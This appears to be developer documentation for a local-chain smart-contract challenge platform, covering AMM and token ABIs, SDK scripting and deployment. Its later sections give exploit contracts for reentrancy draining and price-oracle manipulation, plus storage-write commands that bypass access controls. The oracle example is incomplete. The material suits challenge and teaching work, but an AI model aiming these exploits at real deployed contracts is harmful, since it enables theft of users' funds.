# Smart Contracts

The platform deploys a small set of Solidity contracts on the local Anvil chain. This document covers the ABIs, how to call them from scripts, and how to deploy and interact with your own custom contracts.

---

## Deployed contracts

All addresses come from `contracts/out/addresses.json` (written by `forge script Deploy.s.sol`).

| Contract | Address | Role |
|---|---|---|
| WETH | `0x5FbDB2315678afecb367f032d93F642f64180aa3` | Wrapped ETH |
| USDC | `0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512` | Mock 6-decimal stablecoin |
| DAI | `0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0` | Mock 18-decimal stablecoin |
| AMMFactory | `0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9` | Pool factory |
| WETH/USDC pool | `0xd8058efe0198ae9dD7D563e1b4938Dcbc86A1F81` | AMM pool |
| WETH/DAI pool | `0x6D544390Eb535d61e196c87d6B9c80dCD8628Acd` | AMM pool |

> Addresses are deterministic via `CREATE` on chainId 31337. They stay constant as long as you don't change the deploy script or contract bytecode.

---

## `ConstantProductAMM`

Constant-product AMM (x·y=k) with 0.3% swap fee. Uniswap v2-compatible math.

### View functions

```solidity
function token0() view returns (address)
function token1() view returns (address)
function getReserves() view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast)
function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) pure returns (uint256)
function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) pure returns (uint256)  // no SDK wrapper — use callWithAbi()
function balanceOf(address) view returns (uint256)    // LP shares
function totalSupply() view returns (uint256)
```

### Mutating functions

```solidity
function swapExactIn(
    address tokenIn,
    uint256 amountIn,
    uint256 minAmountOut,
    address to
) returns (uint256 amountOut)

function addLiquidity(
    uint256 amount0Desired,
    uint256 amount1Desired,
    uint256 amount0Min,
    uint256 amount1Min,
    address to
) returns (uint256 amount0, uint256 amount1, uint256 shares)

function removeLiquidity(
    uint256 shares,
    uint256 amount0Min,
    uint256 amount1Min,
    address to
) returns (uint256 amount0, uint256 amount1)
```

### Events

```solidity
event Swap(address indexed sender, uint256 amount0In, uint256 amount1In,
           uint256 amount0Out, uint256 amount1Out, address indexed to)
event Mint(address indexed sender, uint256 amount0, uint256 amount1)
event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to)
event Sync(uint112 reserve0, uint112 reserve1)
```

### Calling from a script

Prefer the high-level SDK (`swap`, `getReserves`, etc.) for pool interactions. For direct AMM calls, use `callWithAbi`:

```js
const POOL_ADDR = "0xd8058efe0198ae9dD7D563e1b4938Dcbc86A1F81";
const POOL_ABI = [
  "function getReserves() view returns (uint112, uint112, uint32)",
  "function getAmountOut(uint256, uint256, uint256) pure returns (uint256)",
  "function swapExactIn(address, uint256, uint256, address) returns (uint256)",
];

// Use the SDK for pool reads
const { reserve0, reserve1 } = await getReserves("weth-usdc-uniswap");
const expectedOut = await quoteOut("weth-usdc-uniswap", "WETH", parseEther("1"));

// Use the SDK swap helper (handles approve automatically)
await swap("weth-usdc-uniswap", "WETH", parseEther("1"), expectedOut * 99n / 100n);

// Or call directly with callWithAbi (must approve manually first)
await approveToken("WETH", POOL_ADDR, parseEther("1"));
const { hash } = await callWithAbi(
  POOL_ADDR, POOL_ABI, "swapExactIn",
  ["0x5FbDB2315678afecb367f032d93F642f64180aa3", parseEther("1"), 0n, getPlayerAddress()],
);
```

---

## `AMMFactory`

Deploys and indexes pools.

```solidity
function createPool(address tokenA, address tokenB) returns (address pool)
function getPool(address, address) view returns (address)
function allPools(uint256 index) view returns (address)
function allPoolsLength() view returns (uint256)
```

### Calling from a script

```js
const FACTORY_ADDR = "0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9";
const FACTORY_ABI = [
  "function createPool(address, address) returns (address)",
  "function getPool(address, address) view returns (address)",
  "function allPoolsLength() view returns (uint256)",
];

// Check if a pool exists
const [poolAddr] = await callWithAbi(
  FACTORY_ADDR, FACTORY_ABI, "getPool",
  ["0x5FbDB2315678afecb367f032d93F642f64180aa3",  // WETH
   "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512"], // USDC
);
log(`Pool: ${poolAddr}`);

// Create a new pool (if you deploy a new token)
const { hash } = await callWithAbi(
  FACTORY_ADDR, FACTORY_ABI, "createPool",
  [myToken0Addr, myToken1Addr],
);
```

---

## `MockERC20`

Standard ERC-20 with owner-only minting.

```solidity
function name() view returns (string)
function symbol() view returns (string)
function decimals() view returns (uint8)
function totalSupply() view returns (uint256)
function balanceOf(address) view returns (uint256)
function allowance(address owner, address spender) view returns (uint256)
function approve(address spender, uint256 amount) returns (bool)
function transfer(address to, uint256 amount) returns (bool)
function transferFrom(address from, address to, uint256 amount) returns (bool)
function mint(address to, uint256 amount)     // onlyOwner
function owner() view returns (address)
```

---

## `WETH`

Standard WETH9 implementation.

```solidity
function deposit() payable          // ETH → WETH
function withdraw(uint256 wad)      // WETH → ETH
function balanceOf(address) view returns (uint256)
function approve(address, uint256) returns (bool)
function transfer(address, uint256) returns (bool)
function transferFrom(address, address, uint256) returns (bool)
function totalSupply() view returns (uint256)
```

---

## Deploying custom contracts

You can deploy contracts from a forge script in the solve workspace, or externally using `forge create`. The script sandbox does not support deploying new contracts directly — use `callWithAbi` to interact with already-deployed contracts, or use the in-browser Solidity IDE / CLI forge workflow to deploy first.

### Option A: deploy from a script (inline bytecode)

For simple contracts, compile with Forge and paste the bytecode:

```bash
# In contracts/
forge build --out out/
cat out/MyContract.sol/MyContract.json | python3 -c "import sys,json; print(json.load(sys.stdin)['bytecode']['object'])"
```

Then in your script:

```js
// Deploy using eth_sendTransaction with data = bytecode
const bytecode = "0x608060405234801561001057...";  // from forge build
const receipt = await rpc("eth_sendTransaction", [{
  from:  getPlayerAddress(),
  data:  bytecode,
  gas:   "0x100000",
}]);
// Mine a block to include it
await rpc("evm_mine", []);
```

### Option B: deploy with Forge (recommended)

Write your contract in `contracts/src/`, compile, and deploy:

```bash
# In a terminal (while engine is running)
forge create contracts/src/MyExploit.sol:MyExploit \
  --rpc-url http://localhost:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast
```

Note the deployed address from the output, then call it from your script.

### Option C: deploy with a Forge script

```solidity
// contracts/script/DeployExploit.s.sol
pragma solidity ^0.8.24;
import "forge-std/Script.sol";
import "../src/MyExploit.sol";

contract DeployExploit is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("DEPLOYER_PRIVATE_KEY"));
        MyExploit exploit = new MyExploit(
            0xd8058efe0198ae9dD7D563e1b4938Dcbc86A1F81,  // pool address
            0x5FbDB2315678afecb367f032d93F642f64180aa3   // WETH
        );
        console.log("Exploit:", address(exploit));
        vm.stopBroadcast();
    }
}
```

```bash
forge script contracts/script/DeployExploit.s.sol \
  --rpc-url http://localhost:8545 \
  --broadcast
```

---

## Custom contract examples

### Example 1: Flash-loan style atomic arb

This contract borrows from one pool's reserves, trades on the other, and repays in one transaction. The AMM doesn't have flash loans built in, but you can combine `swapExactIn` calls atomically.

```solidity
// contracts/src/AtomicArb.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IAMM {
    function swapExactIn(address tokenIn, uint256 amountIn, uint256 minAmountOut, address to)
        external returns (uint256);
    function getReserves() external view returns (uint112, uint112, uint32);
    function getAmountOut(uint256, uint256, uint256) external pure returns (uint256);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract AtomicArb {
    address public owner;

    constructor() { owner = msg.sender; }

    modifier onlyOwner() { require(msg.sender == owner, "not owner"); _; }

    /// @notice Buy WETH on the cheap pool, sell on the expensive pool in one tx
    function arb(
        address cheapPool,
        address dearPool,
        address usdc,
        address weth,
        uint256 usdcIn,
        uint256 minProfit   // minimum USDC profit (after fees)
    ) external onlyOwner returns (uint256 profit) {
        // Step 1: buy WETH cheap
        IERC20(usdc).approve(cheapPool, usdcIn);
        uint256 wethOut = IAMM(cheapPool).swapExactIn(usdc, usdcIn, 0, address(this));

        // Step 2: sell WETH dear
        IERC20(weth).approve(dearPool, wethOut);
        uint256 usdcOut = IAMM(dearPool).swapExactIn(weth, wethOut, 0, address(this));

        require(usdcOut > usdcIn, "no profit");
        profit = usdcOut - usdcIn;
        require(profit >= minProfit, "profit too low");
    }

    function withdraw(address token) external onlyOwner {
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, bal);
    }
}
```

Deploy it, then call from a script:

```js
// After deploying AtomicArb to ARB_ADDR:
const ARB_ABI = [
  "function arb(address cheapPool, address dearPool, address usdc, address weth, uint256 usdcIn, uint256 minProfit) returns (uint256)",
  "function withdraw(address token)",
];

onBlock(async (ctx) => {
  const [pA, pB] = await Promise.all([getPrice("weth-usdc-uniswap"), getPrice("weth-usdc-sushiswap")]);
  const spread = Math.abs(pA - pB) / Math.min(pA, pB);
  if (spread < 0.006) return;   // < 0.6% — not worth it after 2× 0.3% fees

  const [cheap, dear] = pA < pB
    ? ["0xPOOL_A", "0xPOOL_B"]
    : ["0xPOOL_B", "0xPOOL_A"];

  const usdc = await getBalance("USDC");
  const tradeAmt = usdc * 30n / 100n;

  // Pre-check slippage with quoteOut
  const expectedWeth = await quoteOut("weth-usdc-uniswap", "USDC", tradeAmt);

  const ERC20_ABI = [
    "function approve(address, uint256) returns (bool)",
    "function transfer(address, uint256) returns (bool)",
  ];
  const USDC_ADDR = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512";

  // Approve contract to spend our USDC
  await callWithAbi(USDC_ADDR, ERC20_ABI, "approve", [ARB_ADDR, tradeAmt]);

  // Transfer USDC into the contract
  await callWithAbi(USDC_ADDR, ERC20_ABI, "transfer", [ARB_ADDR, tradeAmt]);

  // Execute atomic arb
  const { hash } = await callWithAbi(ARB_ADDR, ARB_ABI, "arb",
    [cheap, dear,
     USDC_ADDR,
     "0x5FbDB2315678afecb367f032d93F642f64180aa3",  // WETH
     tradeAmt,
     tradeAmt],  // require at least break-even
  );
  ctx.log(`[${ctx.blockNumber}] Arb tx: ${hash}`);

  // Withdraw profits back to player
  await callWithAbi(ARB_ADDR, ARB_ABI, "withdraw", [USDC_ADDR]);
});
```

---

### Example 2: Reentrancy exploit on a vulnerable contract

If a challenge deploys a contract with a reentrancy vulnerability, you can write an exploit contract that calls the vulnerable function recursively:

```solidity
// contracts/src/ReentrancyExploit.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerable {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
    function balanceOf(address) external view returns (uint256);
}

contract ReentrancyExploit {
    IVulnerable public target;
    address public owner;
    uint256 public attackAmount;

    constructor(address _target) {
        target = IVulnerable(_target);
        owner  = msg.sender;
    }

    function attack() external payable {
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }

    function drain() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
```

Call from a script:

```js
// Deploy externally via forge, then call from the SDK:
const EXPLOIT_ADDR = "0x...";
const EXPLOIT_ABI = [
  "function attack() payable",
  "function drain()",
];

onBlock(async (ctx) => {
  if (ctx.blockNumber !== 1) return;

  await callWithAbi(EXPLOIT_ADDR, EXPLOIT_ABI, "attack", [], parseEther("1"));
  await callWithAbi(EXPLOIT_ADDR, EXPLOIT_ABI, "drain", []);
  ctx.log("Exploit complete");
});
```

---

### Example 3: Price oracle manipulation

The AMM's spot price is derived from reserves. A contract that reads the AMM as a price oracle is vulnerable to manipulation within a single transaction block.

```solidity
// contracts/src/OracleManipulator.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IAMM {
    function swapExactIn(address, uint256, uint256, address) external returns (uint256);
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IVulnOracle {
    // Vulnerable contract that reads AMM spot price and mints tokens if "cheap enough"
    function buyTokens() external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IERC20 {
    function approve(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract OracleManipulator {
    address owner;

    constructor() { owner = msg.sender; }

    function manipulate(
        address pool,
        address oracle,
        address usdc,
        address weth,
        address rewardToken,
        uint256 usdcIn         // capital for manipulation
    ) external {
        // Step 1: drive price DOWN by selling lots of WETH
        IERC20(usdc).approve(pool, usdcIn);
        // Buy WETH first (if needed), then dump it to crash price
        uint256 wethBal = IERC20(weth).balanceOf(address(this));
        if (wethBal > 0) {
            IERC20(weth).approve(pool, wethBal);
            IAMM(pool).swapExactIn(weth, wethBal, 0, address(this));
        }

        // Step 2: exploit the oracle while price is depressed
        IVulnOracle(oracle).buyTokens();

        // Step 3: recover — buy WETH back to restore price (optional)
        // ...

        // Withdraw reward tokens
        uint256 reward = IERC20(rewardToken).balanceOf(address(this));
        IERC20(rewardToken).transfer(owner, reward);
    }
}
```

---

## Calling custom contracts from the script SDK

The SDK provides two primitives for calling arbitrary contracts. Use `callWithAbi` for
state-changing calls (it uses the player signer and waits for a receipt). For read-only
calls, use `readContract` (if the contract is registered) or build the call with
`callWithAbi` pointing to a view function — the transaction will be a `call`, not a
`sendTransaction`, because view functions don't change state.

```js
// State-changing call with custom ABI
const { hash, blockNumber } = await callWithAbi(
  contractAddress,
  ["function myWrite(address to, uint256 amount) returns (bool)"],
  "myWrite",
  [recipientAddress, parseEther("1")],
  0n,   // ETH value to send (wei)
);

// Read-only via a registered contract ID
const result = await readContract("myContract", "myView", [42n]);

// Read-only via callWithAbi (no state change; no ETH)
const bal = await callWithAbi(
  contractAddress,
  ["function balanceOf(address) view returns (uint256)"],
  "balanceOf",
  [getPlayerAddress()],
);
```

For complex ABIs, define the array once and reuse it:

```js
const MY_ABI = [
  "function deposit(uint256) payable",
  "function withdraw(uint256)",
  "function balanceOf(address) view returns (uint256)",
];

const { hash } = await callWithAbi(MY_CONTRACT, MY_ABI, "deposit", [parseEther("1")], parseEther("1"));
```

---

## Inspecting transactions and logs

To inspect past transactions use `getBlockTransactions` (SDK) or `cast block` (CLI).
Log decoding and event queries are not available as direct SDK primitives — use
`getBlockTransactions` to find relevant transactions, then decode calldata with
`decodeCalldata`, or use `cast` tools for log queries.

```js
// Find transactions to a contract in block 1 (setup block)
const txs = await getBlockTransactions(1);
for (const tx of txs) {
  if (tx.to?.toLowerCase() === getContractAddress("vault").toLowerCase()) {
    // Strip 4-byte selector and decode calldata
    const data = "0x" + tx.data.slice(10);
    const decoded = decodeCalldata(["uint256", "address"], data);
    log(`Init args: ${JSON.stringify(decoded)}`);
  }
}
```

```bash
# Query logs from the CLI (while engine running)
cast logs --rpc-url $RPC_URL \
  --address $ADDR_VAULT \
  "Deposit(address indexed user, uint256 amount)" \
  --from-block 0 --to-block latest
```

---

## Storage slots (Anvil cheats via cast)

For exploit development you can read and write arbitrary storage directly via `cast`:

```bash
# Read storage slot 0 of a contract
cast storage $ADDR_VAULT 0 --rpc-url $RPC_URL

# Write storage slot (bypass access controls — Anvil only)
cast rpc anvil_setStorageAt $ADDR_VAULT \
  0x0000000000000000000000000000000000000000000000000000000000000000 \
  0x0000000000000000000000000000000000000000000000000000000000000001 \
  --rpc-url $RPC_URL
```

> The `rpc()` helper is not available in the Script Sandbox. Storage manipulation must be done via the CLI.

---

## forge test (off-chain testing)

Write Forge tests to prototype exploit logic before deploying:

```solidity
// contracts/test/MyExploit.t.sol
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/AtomicArb.sol";
import "../src/amm/ConstantProductAMM.sol";

contract MyExploitTest is Test {
    AtomicArb arb;
    ConstantProductAMM poolA;
    ConstantProductAMM poolB;

    function setUp() public {
        // Setup with the same addresses as the live chain
        arb   = new AtomicArb();
        poolA = ConstantProductAMM(0xd8058efe0198ae9dD7D563e1b4938Dcbc86A1F81);
        poolB = ConstantProductAMM(0x...);
    }

    function testArb() public {
        // Fork from live chain state
        vm.createSelectFork("http://localhost:8545");
        // ... test your logic
    }
}
```

```bash
forge test --rpc-url http://localhost:8545 --fork-url http://localhost:8545
```
